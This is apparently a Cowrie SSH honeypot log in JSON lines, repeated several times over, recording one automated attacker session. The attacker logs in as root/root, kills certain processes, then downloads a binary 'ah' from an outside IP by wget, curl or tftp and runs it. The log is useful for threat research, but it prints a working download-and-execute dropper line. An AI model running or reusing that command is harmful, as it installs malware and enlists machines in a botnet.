{"eventid":"cowrie.command.failed","input":"shell","message":"Command not found: shell","sensor":"","timestamp":"2023-11-30T01:42:07.345546Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"sh","message":"CMD: sh","sensor":"","timestamp":"2023-11-30T01:42:07.346481Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"linuxshell","message":"CMD: linuxshell","sensor":"","timestamp":"2023-11-30T01:42:07.348235Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.failed","input":"linuxshell","message":"Command not found: linuxshell","sensor":"","timestamp":"2023-11-30T01:42:07.349000Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"cd /tmp/; echo \"senpai\" > rootsenpai; cat rootsenpai; rm -rf rootsenpai","message":"CMD: cd /tmp/; echo \"senpai\" > rootsenpai; cat rootsenpai; rm -rf rootsenpai","sensor":"","timestamp":"2023-11-30T01:42:07.354857Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"for dir in /proc/[0-9]*; do grep -q \"(deleted)\" \"$dir/maps\" && echo \"Killing process with PID: $(basename $dir)\" && kill -9 $(basename $dir); done;; rm -rf ah; wget http://94.156.68.152/ah || curl -O http://94.156.68.152/ah || tftp 94.156.68.152 -c get ah || tftp -g -r ah 94.156.68.152; chmod 777 ah;./ah ssh; rm -rf ah","message":"CMD: for dir in /proc/[0-9]*; do grep -q \"(deleted)\" \"$dir/maps\" && echo \"Killing process with PID: $(basename $dir)\" && kill -9 $(basename $dir); done;; rm -rf ah; wget http://94.156.68.152/ah || curl -O http://94.156.68.152/ah || tftp 94.156.68.152 -c get ah || tftp -g -r ah 94.156.68.152; chmod 777 ah;./ah ssh; rm -rf ah","sensor":"","timestamp":"2023-11-30T01:42:07.457483Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"basename $dir","message":"CMD: basename $dir","sensor":"","timestamp":"2023-11-30T01:42:07.458423Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.failed","input":"basename $dir","message":"Command not found: basename $dir","sensor":"","timestamp":"2023-11-30T01:42:07.460015Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"basename $dir","message":"CMD: basename $dir","sensor":"","timestamp":"2023-11-30T01:42:07.460604Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.failed","input":"basename $dir","message":"Command not found: basename $dir","sensor":"","timestamp":"2023-11-30T01:42:07.461404Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.failed","input":"for dir in /proc/ [ 0-9 ] *","message":"Command not found: for dir in /proc/ [ 0-9 ] *","sensor":"","timestamp":"2023-11-30T01:42:07.462472Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.failed","input":"deleted $dir/maps","message":"Command not found: deleted $dir/maps","sensor":"","timestamp":"2023-11-30T01:42:07.463262Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.session.file_download","url":"http://94.156.68.152/ah","outfile":"var/lib/cowrie/downloads/fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054","shasum":"fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054","sensor":"","timestamp":"2023-11-30T01:42:07.748981Z","message":"Downloaded URL (http://94.156.68.152/ah) with SHA-256 fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054 to var/lib/cowrie/downloads/fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.session.file_download","url":"http://94.156.68.152/ah","outfile":"var/lib/cowrie/downloads/fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054","shasum":"fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054","sensor":"","timestamp":"2023-11-30T01:42:08.032984Z","message":"Downloaded URL (http://94.156.68.152/ah) with SHA-256 fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054 to var/lib/cowrie/downloads/fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.session.file_download.failed","url":"http://94.156.68.152/ah","sensor":"","timestamp":"2023-11-30T01:42:23.066389Z","message":"Attempt to download file(s) from URL (http://94.156.68.152/ah) failed","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.session.file_download","duplicate":false,"outfile":"var/lib/cowrie/downloads/199d11d0fd7043fe9206954ed8bc7b54d1912013a2a71bdf8bb007b71bb490c8","shasum":"199d11d0fd7043fe9206954ed8bc7b54d1912013a2a71bdf8bb007b71bb490c8","destfile":"/tmp/rootsenpai","message":"Saved redir contents with SHA-256 199d11d0fd7043fe9206954ed8bc7b54d1912013a2a71bdf8bb007b71bb490c8 to var/lib/cowrie/downloads/199d11d0fd7043fe9206954ed8bc7b54d1912013a2a71bdf8bb007b71bb490c8","sensor":"","timestamp":"2023-11-30T01:42:57.566448Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.log.closed","ttylog":"var/lib/cowrie/tty/35418a8d6dcb23a0ee6716fc1f7ae2255bd9f34584706ff5b8c6f8f42b98100f","size":2745,"shasum":"35418a8d6dcb23a0ee6716fc1f7ae2255bd9f34584706ff5b8c6f8f42b98100f","duplicate":false,"duration":50.38083243370056,"message":"Closing TTY Log: var/lib/cowrie/tty/35418a8d6dcb23a0ee6716fc1f7ae2255bd9f34584706ff5b8c6f8f42b98100f after 50 seconds","sensor":"","timestamp":"2023-11-30T01:42:57.567406Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.session.closed","duration":51.115936279296875,"message":"Connection lost after 51 seconds","sensor":"","timestamp":"2023-11-30T01:42:57.643806Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.session.connect","src_ip":"204.76.203.13","src_port":54330,"dst_ip":"172.31.5.68","dst_port":2222,"session":"651b145b8fb8","protocol":"ssh","message":"New connection: 204.76.203.13:54330 (172.31.5.68:2222) [session: 651b145b8fb8]","sensor":"","timestamp":"2023-11-30T01:42:06.527180Z"}
{"eventid":"cowrie.client.version","version":"SSH-2.0-libssh2_1.10.0","message":"Remote SSH version: SSH-2.0-libssh2_1.10.0","sensor":"","timestamp":"2023-11-30T01:42:06.528321Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.client.kex","hassh":"63ae64767f334c6a74647d80edb0291e","hasshAlgorithms":"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group-exchange-sha256,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,diffie-hellman-group-exchange-sha1;aes128-ctr,aes192-ctr,aes256-ctr,aes256-cbc,rijndael-cbc@lysator.liu.se,aes192-cbc,aes128-cbc,blowfish-cbc,arcfour128,arcfour,cast128-cbc,3des-cbc,none;hmac-sha2-256,hmac-sha2-512,hmac-sha1,hmac-sha1-96,hmac-md5,hmac-md5-96,hmac-ripemd160,hmac-ripemd160@openssh.com,none;none","kexAlgs":["curve25519-sha256","curve25519-sha256@libssh.org","ecdh-sha2-nistp256","ecdh-sha2-nistp384","ecdh-sha2-nistp521","diffie-hellman-group-exchange-sha256","diffie-hellman-group16-sha512","diffie-hellman-group18-sha512","diffie-hellman-group14-sha256","diffie-hellman-group14-sha1","diffie-hellman-group1-sha1","diffie-hellman-group-exchange-sha1"],"keyAlgs":["ecdsa-sha2-nistp256","ecdsa-sha2-nistp384","ecdsa-sha2-nistp521","ecdsa-sha2-nistp256-cert-v01@openssh.com","ecdsa-sha2-nistp384-cert-v01@openssh.com","ecdsa-sha2-nistp521-cert-v01@openssh.com","ssh-ed25519","ssh-rsa","ssh-dss"],"encCS":["aes128-ctr","aes192-ctr","aes256-ctr","aes256-cbc","rijndael-cbc@lysator.liu.se","aes192-cbc","aes128-cbc","blowfish-cbc","arcfour128","arcfour","cast128-cbc","3des-cbc","none"],"macCS":["hmac-sha2-256","hmac-sha2-512","hmac-sha1","hmac-sha1-96","hmac-md5","hmac-md5-96","hmac-ripemd160","hmac-ripemd160@openssh.com","none"],"compCS":["none"],"langCS":[""],"message":"SSH client hassh fingerprint: 63ae64767f334c6a74647d80edb0291e","sensor":"","timestamp":"2023-11-30T01:42:06.603497Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.login.success","username":"root","password":"root","message":"login attempt [root/root] succeeded","sensor":"","timestamp":"2023-11-30T01:42:06.993253Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.session.params","arch":"linux-x64-lsb","message":[],"sensor":"","timestamp":"2023-11-30T01:42:07.187733Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"enable","message":"CMD: enable","sensor":"","timestamp":"2023-11-30T01:42:07.264680Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"system","message":"CMD: system","sensor":"","timestamp":"2023-11-30T01:42:07.342616Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.failed","input":"system","message":"Command not found: system","sensor":"","timestamp":"2023-11-30T01:42:07.343543Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"shell","message":"CMD: shell","sensor":"","timestamp":"2023-11-30T01:42:07.344757Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.failed","input":"shell","message":"Command not found: shell","sensor":"","timestamp":"2023-11-30T01:42:07.345546Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"sh","message":"CMD: sh","sensor":"","timestamp":"2023-11-30T01:42:07.346481Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"linuxshell","message":"CMD: linuxshell","sensor":"","timestamp":"2023-11-30T01:42:07.348235Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.failed","input":"linuxshell","message":"Command not found: linuxshell","sensor":"","timestamp":"2023-11-30T01:42:07.349000Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"cd /tmp/; echo \"senpai\" > rootsenpai; cat rootsenpai; rm -rf rootsenpai","message":"CMD: cd /tmp/; echo \"senpai\" > rootsenpai; cat rootsenpai; rm -rf rootsenpai","sensor":"","timestamp":"2023-11-30T01:42:07.354857Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"for dir in /proc/[0-9]*; do grep -q \"(deleted)\" \"$dir/maps\" && echo \"Killing process with PID: $(basename $dir)\" && kill -9 $(basename $dir); done;; rm -rf ah; wget http://94.156.68.152/ah || curl -O http://94.156.68.152/ah || tftp 94.156.68.152 -c get ah || tftp -g -r ah 94.156.68.152; chmod 777 ah;./ah ssh; rm -rf ah","message":"CMD: for dir in /proc/[0-9]*; do grep -q \"(deleted)\" \"$dir/maps\" && echo \"Killing process with PID: $(basename $dir)\" && kill -9 $(basename $dir); done;; rm -rf ah; wget http://94.156.68.152/ah || curl -O http://94.156.68.152/ah || tftp 94.156.68.152 -c get ah || tftp -g -r ah 94.156.68.152; chmod 777 ah;./ah ssh; rm -rf ah","sensor":"","timestamp":"2023-11-30T01:42:07.457483Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"basename $dir","message":"CMD: basename $dir","sensor":"","timestamp":"2023-11-30T01:42:07.458423Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.failed","input":"basename $dir","message":"Command not found: basename $dir","sensor":"","timestamp":"2023-11-30T01:42:07.460015Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"basename $dir","message":"CMD: basename $dir","sensor":"","timestamp":"2023-11-30T01:42:07.460604Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.failed","input":"basename $dir","message":"Command not found: basename $dir","sensor":"","timestamp":"2023-11-30T01:42:07.461404Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.failed","input":"for dir in /proc/ [ 0-9 ] *","message":"Command not found: for dir in /proc/ [ 0-9 ] *","sensor":"","timestamp":"2023-11-30T01:42:07.462472Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.failed","input":"deleted $dir/maps","message":"Command not found: deleted $dir/maps","sensor":"","timestamp":"2023-11-30T01:42:07.463262Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.session.file_download","url":"http://94.156.68.152/ah","outfile":"var/lib/cowrie/downloads/fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054","shasum":"fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054","sensor":"","timestamp":"2023-11-30T01:42:07.748981Z","message":"Downloaded URL (http://94.156.68.152/ah) with SHA-256 fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054 to var/lib/cowrie/downloads/fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.session.file_download","url":"http://94.156.68.152/ah","outfile":"var/lib/cowrie/downloads/fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054","shasum":"fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054","sensor":"","timestamp":"2023-11-30T01:42:08.032984Z","message":"Downloaded URL (http://94.156.68.152/ah) with SHA-256 fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054 to var/lib/cowrie/downloads/fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.session.file_download.failed","url":"http://94.156.68.152/ah","sensor":"","timestamp":"2023-11-30T01:42:23.066389Z","message":"Attempt to download file(s) from URL (http://94.156.68.152/ah) failed","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.session.file_download","duplicate":false,"outfile":"var/lib/cowrie/downloads/199d11d0fd7043fe9206954ed8bc7b54d1912013a2a71bdf8bb007b71bb490c8","shasum":"199d11d0fd7043fe9206954ed8bc7b54d1912013a2a71bdf8bb007b71bb490c8","destfile":"/tmp/rootsenpai","message":"Saved redir contents with SHA-256 199d11d0fd7043fe9206954ed8bc7b54d1912013a2a71bdf8bb007b71bb490c8 to var/lib/cowrie/downloads/199d11d0fd7043fe9206954ed8bc7b54d1912013a2a71bdf8bb007b71bb490c8","sensor":"","timestamp":"2023-11-30T01:42:57.566448Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.log.closed","ttylog":"var/lib/cowrie/tty/35418a8d6dcb23a0ee6716fc1f7ae2255bd9f34584706ff5b8c6f8f42b98100f","size":2745,"shasum":"35418a8d6dcb23a0ee6716fc1f7ae2255bd9f34584706ff5b8c6f8f42b98100f","duplicate":false,"duration":50.38083243370056,"message":"Closing TTY Log: var/lib/cowrie/tty/35418a8d6dcb23a0ee6716fc1f7ae2255bd9f34584706ff5b8c6f8f42b98100f after 50 seconds","sensor":"","timestamp":"2023-11-30T01:42:57.567406Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.session.closed","duration":51.115936279296875,"message":"Connection lost after 51 seconds","sensor":"","timestamp":"2023-11-30T01:42:57.643806Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.session.connect","src_ip":"204.76.203.13","src_port":54330,"dst_ip":"172.31.5.68","dst_port":2222,"session":"651b145b8fb8","protocol":"ssh","message":"New connection: 204.76.203.13:54330 (172.31.5.68:2222) [session: 651b145b8fb8]","sensor":"","timestamp":"2023-11-30T01:42:06.527180Z"}
{"eventid":"cowrie.client.version","version":"SSH-2.0-libssh2_1.10.0","message":"Remote SSH version: SSH-2.0-libssh2_1.10.0","sensor":"","timestamp":"2023-11-30T01:42:06.528321Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.client.kex","hassh":"63ae64767f334c6a74647d80edb0291e","hasshAlgorithms":"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group-exchange-sha256,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,diffie-hellman-group-exchange-sha1;aes128-ctr,aes192-ctr,aes256-ctr,aes256-cbc,rijndael-cbc@lysator.liu.se,aes192-cbc,aes128-cbc,blowfish-cbc,arcfour128,arcfour,cast128-cbc,3des-cbc,none;hmac-sha2-256,hmac-sha2-512,hmac-sha1,hmac-sha1-96,hmac-md5,hmac-md5-96,hmac-ripemd160,hmac-ripemd160@openssh.com,none;none","kexAlgs":["curve25519-sha256","curve25519-sha256@libssh.org","ecdh-sha2-nistp256","ecdh-sha2-nistp384","ecdh-sha2-nistp521","diffie-hellman-group-exchange-sha256","diffie-hellman-group16-sha512","diffie-hellman-group18-sha512","diffie-hellman-group14-sha256","diffie-hellman-group14-sha1","diffie-hellman-group1-sha1","diffie-hellman-group-exchange-sha1"],"keyAlgs":["ecdsa-sha2-nistp256","ecdsa-sha2-nistp384","ecdsa-sha2-nistp521","ecdsa-sha2-nistp256-cert-v01@openssh.com","ecdsa-sha2-nistp384-cert-v01@openssh.com","ecdsa-sha2-nistp521-cert-v01@openssh.com","ssh-ed25519","ssh-rsa","ssh-dss"],"encCS":["aes128-ctr","aes192-ctr","aes256-ctr","aes256-cbc","rijndael-cbc@lysator.liu.se","aes192-cbc","aes128-cbc","blowfish-cbc","arcfour128","arcfour","cast128-cbc","3des-cbc","none"],"macCS":["hmac-sha2-256","hmac-sha2-512","hmac-sha1","hmac-sha1-96","hmac-md5","hmac-md5-96","hmac-ripemd160","hmac-ripemd160@openssh.com","none"],"compCS":["none"],"langCS":[""],"message":"SSH client hassh fingerprint: 63ae64767f334c6a74647d80edb0291e","sensor":"","timestamp":"2023-11-30T01:42:06.603497Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.login.success","username":"root","password":"root","message":"login attempt [root/root] succeeded","sensor":"","timestamp":"2023-11-30T01:42:06.993253Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.session.params","arch":"linux-x64-lsb","message":[],"sensor":"","timestamp":"2023-11-30T01:42:07.187733Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"enable","message":"CMD: enable","sensor":"","timestamp":"2023-11-30T01:42:07.264680Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"system","message":"CMD: system","sensor":"","timestamp":"2023-11-30T01:42:07.342616Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.failed","input":"system","message":"Command not found: system","sensor":"","timestamp":"2023-11-30T01:42:07.343543Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"shell","message":"CMD: shell","sensor":"","timestamp":"2023-11-30T01:42:07.344757Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.failed","input":"shell","message":"Command not found: shell","sensor":"","timestamp":"2023-11-30T01:42:07.345546Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"sh","message":"CMD: sh","sensor":"","timestamp":"2023-11-30T01:42:07.346481Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"linuxshell","message":"CMD: linuxshell","sensor":"","timestamp":"2023-11-30T01:42:07.348235Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.failed","input":"linuxshell","message":"Command not found: linuxshell","sensor":"","timestamp":"2023-11-30T01:42:07.349000Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"cd /tmp/; echo \"senpai\" > rootsenpai; cat rootsenpai; rm -rf rootsenpai","message":"CMD: cd /tmp/; echo \"senpai\" > rootsenpai; cat rootsenpai; rm -rf rootsenpai","sensor":"","timestamp":"2023-11-30T01:42:07.354857Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"for dir in /proc/[0-9]*; do grep -q \"(deleted)\" \"$dir/maps\" && echo \"Killing process with PID: $(basename $dir)\" && kill -9 $(basename $dir); done;; rm -rf ah; wget http://94.156.68.152/ah || curl -O http://94.156.68.152/ah || tftp 94.156.68.152 -c get ah || tftp -g -r ah 94.156.68.152; chmod 777 ah;./ah ssh; rm -rf ah","message":"CMD: for dir in /proc/[0-9]*; do grep -q \"(deleted)\" \"$dir/maps\" && echo \"Killing process with PID: $(basename $dir)\" && kill -9 $(basename $dir); done;; rm -rf ah; wget http://94.156.68.152/ah || curl -O http://94.156.68.152/ah || tftp 94.156.68.152 -c get ah || tftp -g -r ah 94.156.68.152; chmod 777 ah;./ah ssh; rm -rf ah","sensor":"","timestamp":"2023-11-30T01:42:07.457483Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"basename $dir","message":"CMD: basename $dir","sensor":"","timestamp":"2023-11-30T01:42:07.458423Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.failed","input":"basename $dir","message":"Command not found: basename $dir","sensor":"","timestamp":"2023-11-30T01:42:07.460015Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"basename $dir","message":"CMD: basename $dir","sensor":"","timestamp":"2023-11-30T01:42:07.460604Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.failed","input":"basename $dir","message":"Command not found: basename $dir","sensor":"","timestamp":"2023-11-30T01:42:07.461404Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.failed","input":"for dir in /proc/ [ 0-9 ] *","message":"Command not found: for dir in /proc/ [ 0-9 ] *","sensor":"","timestamp":"2023-11-30T01:42:07.462472Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.failed","input":"deleted $dir/maps","message":"Command not found: deleted $dir/maps","sensor":"","timestamp":"2023-11-30T01:42:07.463262Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.session.file_download","url":"http://94.156.68.152/ah","outfile":"var/lib/cowrie/downloads/fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054","shasum":"fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054","sensor":"","timestamp":"2023-11-30T01:42:07.748981Z","message":"Downloaded URL (http://94.156.68.152/ah) with SHA-256 fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054 to var/lib/cowrie/downloads/fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.session.file_download","url":"http://94.156.68.152/ah","outfile":"var/lib/cowrie/downloads/fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054","shasum":"fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054","sensor":"","timestamp":"2023-11-30T01:42:08.032984Z","message":"Downloaded URL (http://94.156.68.152/ah) with SHA-256 fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054 to var/lib/cowrie/downloads/fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.session.file_download.failed","url":"http://94.156.68.152/ah","sensor":"","timestamp":"2023-11-30T01:42:23.066389Z","message":"Attempt to download file(s) from URL (http://94.156.68.152/ah) failed","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.session.file_download","duplicate":false,"outfile":"var/lib/cowrie/downloads/199d11d0fd7043fe9206954ed8bc7b54d1912013a2a71bdf8bb007b71bb490c8","shasum":"199d11d0fd7043fe9206954ed8bc7b54d1912013a2a71bdf8bb007b71bb490c8","destfile":"/tmp/rootsenpai","message":"Saved redir contents with SHA-256 199d11d0fd7043fe9206954ed8bc7b54d1912013a2a71bdf8bb007b71bb490c8 to var/lib/cowrie/downloads/199d11d0fd7043fe9206954ed8bc7b54d1912013a2a71bdf8bb007b71bb490c8","sensor":"","timestamp":"2023-11-30T01:42:57.566448Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.log.closed","ttylog":"var/lib/cowrie/tty/35418a8d6dcb23a0ee6716fc1f7ae2255bd9f34584706ff5b8c6f8f42b98100f","size":2745,"shasum":"35418a8d6dcb23a0ee6716fc1f7ae2255bd9f34584706ff5b8c6f8f42b98100f","duplicate":false,"duration":50.38083243370056,"message":"Closing TTY Log: var/lib/cowrie/tty/35418a8d6dcb23a0ee6716fc1f7ae2255bd9f34584706ff5b8c6f8f42b98100f after 50 seconds","sensor":"","timestamp":"2023-11-30T01:42:57.567406Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.session.closed","duration":51.115936279296875,"message":"Connection lost after 51 seconds","sensor":"","timestamp":"2023-11-30T01:42:57.643806Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.session.connect","src_ip":"204.76.203.13","src_port":54330,"dst_ip":"172.31.5.68","dst_port":2222,"session":"651b145b8fb8","protocol":"ssh","message":"New connection: 204.76.203.13:54330 (172.31.5.68:2222) [session: 651b145b8fb8]","sensor":"","timestamp":"2023-11-30T01:42:06.527180Z"}
{"eventid":"cowrie.client.version","version":"SSH-2.0-libssh2_1.10.0","message":"Remote SSH version: SSH-2.0-libssh2_1.10.0","sensor":"","timestamp":"2023-11-30T01:42:06.528321Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.client.kex","hassh":"63ae64767f334c6a74647d80edb0291e","hasshAlgorithms":"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group-exchange-sha256,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,diffie-hellman-group-exchange-sha1;aes128-ctr,aes192-ctr,aes256-ctr,aes256-cbc,rijndael-cbc@lysator.liu.se,aes192-cbc,aes128-cbc,blowfish-cbc,arcfour128,arcfour,cast128-cbc,3des-cbc,none;hmac-sha2-256,hmac-sha2-512,hmac-sha1,hmac-sha1-96,hmac-md5,hmac-md5-96,hmac-ripemd160,hmac-ripemd160@openssh.com,none;none","kexAlgs":["curve25519-sha256","curve25519-sha256@libssh.org","ecdh-sha2-nistp256","ecdh-sha2-nistp384","ecdh-sha2-nistp521","diffie-hellman-group-exchange-sha256","diffie-hellman-group16-sha512","diffie-hellman-group18-sha512","diffie-hellman-group14-sha256","diffie-hellman-group14-sha1","diffie-hellman-group1-sha1","diffie-hellman-group-exchange-sha1"],"keyAlgs":["ecdsa-sha2-nistp256","ecdsa-sha2-nistp384","ecdsa-sha2-nistp521","ecdsa-sha2-nistp256-cert-v01@openssh.com","ecdsa-sha2-nistp384-cert-v01@openssh.com","ecdsa-sha2-nistp521-cert-v01@openssh.com","ssh-ed25519","ssh-rsa","ssh-dss"],"encCS":["aes128-ctr","aes192-ctr","aes256-ctr","aes256-cbc","rijndael-cbc@lysator.liu.se","aes192-cbc","aes128-cbc","blowfish-cbc","arcfour128","arcfour","cast128-cbc","3des-cbc","none"],"macCS":["hmac-sha2-256","hmac-sha2-512","hmac-sha1","hmac-sha1-96","hmac-md5","hmac-md5-96","hmac-ripemd160","hmac-ripemd160@openssh.com","none"],"compCS":["none"],"langCS":[""],"message":"SSH client hassh fingerprint: 63ae64767f334c6a74647d80edb0291e","sensor":"","timestamp":"2023-11-30T01:42:06.603497Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.login.success","username":"root","password":"root","message":"login attempt [root/root] succeeded","sensor":"","timestamp":"2023-11-30T01:42:06.993253Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.session.params","arch":"linux-x64-lsb","message":[],"sensor":"","timestamp":"2023-11-30T01:42:07.187733Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"enable","message":"CMD: enable","sensor":"","timestamp":"2023-11-30T01:42:07.264680Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
